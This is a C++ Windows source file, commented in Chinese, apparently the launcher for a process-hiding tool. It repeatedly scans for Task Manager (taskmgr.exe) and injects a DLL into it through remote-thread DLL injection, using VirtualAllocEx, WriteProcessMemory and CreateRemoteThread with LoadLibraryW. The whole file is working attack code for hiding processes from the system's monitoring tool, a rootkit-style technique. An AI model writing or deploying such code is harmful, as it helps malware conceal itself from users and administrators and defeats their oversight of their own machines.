// ProcessHiding.cpp : 定义控制台应用程序的入口点。
//

//此项目为启动项 exe部分 使dll运行起来

#include "stdafx.h"

#include <io.h>
#include <time.h>
#include <conio.h>
#include <fstream>

using namespace std;

ofstream infile3;

char* filename3 = "C:\\outputexe.txt";


#pragma comment(lib, "advapi32.lib")

TCHAR * DLL_NAME = L"InjectDll.dll";

BOOL InjectRemoteThread(DWORD ProcessID);
void Test();

int main()
{

	int count = 0;
	bool already = false;
	TCHAR dllpathBuffer[MAX_PATH];
	GetFullPathName(DLL_NAME, MAX_PATH, dllpathBuffer, NULL);
	DLL_NAME = dllpathBuffer;

	infile3.open(filename3);

	do{
		//printf("\n\n第%d次扫描...\n", count + 1);
		Sleep(2000);
		//Get first process in list
		HANDLE hProcessSnap = NULL;

		PROCESSENTRY32 peProcess = { 0 };

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
		{//INVALID_HANDLE_VALUE为HANDLE的无效值
			printf("Unable to get process list (%d).\n", GetLastError());
			return 0;
		}

		peProcess.dwSize = sizeof(PROCESSENTRY32);

		WCHAR wProcessName[100] = L"taskmgr.exe";
		//StringCbPrintf(wProcessName, 100, L"%S", ProcessName);
		//wprintf(L"Try to find proccess name '%s' \n", wProcessName);

		bool bFound = false;

		if (Process32First(hProcessSnap, &peProcess))
		{
			count++;
			do
			{
				if (!wcscmp(peProcess.szExeFile, wProcessName))
				{
					//wprintf(L"\n Found %s ProcessID: %d \n", wProcessName, peProcess.th32ProcessID);
					bFound = true;
					if (already == false)
					{

						InjectRemoteThread(peProcess.th32ProcessID);
						//注入远程线程
						printf("hiding OK!\n");
						already = true;
					}


				}
			} while (Process32Next(hProcessSnap, &peProcess));
		}

		if (!bFound)
		{
			//wprintf(L"\n Process '%s' not found!\n\n", wProcessName);
			already = false;
		}

		time_t t;
		infile3 << time(&t) << endl;
		infile3.close();
		//int iii;
		//scanf("%d", &iii);

		//printf("\n第%d次扫描结束...\n\n", count);


	} while (true);

	system("pause");

	return 0;
}

void Test()
{
	//printf("注入注入注入\n\n");
}



//注入远程线程
BOOL InjectRemoteThread(DWORD ProcessID)
{

	if (!ProcessID)
	{
		MessageBox(NULL, (LPCWSTR)GetLastError(), L"An error occured, ProcessID Error.", NULL);
		return 0;
	}

	//OpenProcess()根据目标进程名，获得进程句柄，以便后续操作
	HANDLE RemoteProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessID);
	if (!RemoteProc)
	{
		MessageBox(NULL, (LPCWSTR)GetLastError(), L"An error occured, Fail to OpenProc", NULL);
		return 0;
	}

	//GetProcAddress()返回指定的动态链接库中的函数地址
	LPVOID LoadLibAddress = (LPVOID)GetProcAddress(
		GetModuleHandleA("kernel32.dll"),
		"LoadLibraryW");

	infile3 << "LoadLibraryW" << LoadLibAddress << endl;

	//VirtualAllocEx()跨进程分配内存
	LPVOID MemAlloc = (LPVOID)VirtualAllocEx(
		RemoteProc,
		NULL,
		(wcslen(DLL_NAME) + 1) * 2,		//欲分配的内存大小，字节单位
		//strlen(DLL_NAME) + 1,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE);
	infile3 << "RemoteProc " << RemoteProc << endl;

	//printf("\n Memory Address to Write:0x%08x \n", MemAlloc);

	//WriteProcessMemory()向目标进程写入函数需要加载的dll名称
	WriteProcessMemory(
		RemoteProc,
		(LPVOID)MemAlloc,
		DLL_NAME,
		(wcslen(DLL_NAME) + 1) * 2,
		//strlen(DLL_NAME) + 1,
		NULL);

	//CreateRemoteThread()在目标进程中创建一个线程
	CreateRemoteThread(
		RemoteProc,
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)LoadLibAddress,
		(LPVOID)MemAlloc,
		NULL,
		NULL);

	CloseHandle(RemoteProc);

	//释放申请的虚拟内存空间
	VirtualFreeEx(
		RemoteProc,
		(LPVOID)MemAlloc,
		0,
		MEM_RELEASE | MEM_DECOMMIT);

	infile3 << "error " << GetLastError() << endl;

	return 1;
}

